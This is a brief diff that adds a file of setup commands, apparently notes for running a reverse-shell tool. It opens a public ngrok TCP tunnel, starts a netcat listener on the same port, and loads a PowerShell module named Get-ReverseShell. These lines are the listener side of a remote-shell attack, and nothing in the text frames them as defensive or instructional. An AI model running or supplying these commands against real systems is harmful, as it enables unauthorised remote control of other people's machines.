@@ -1,0 +1,5 @@
+ngrok tcp 32768
+
+nc -nvlp 32768 
+
+cd tools/Get-ReverseShell && pwsh -NoExit -Command "Import-Module ./get-reverseshell.ps1"
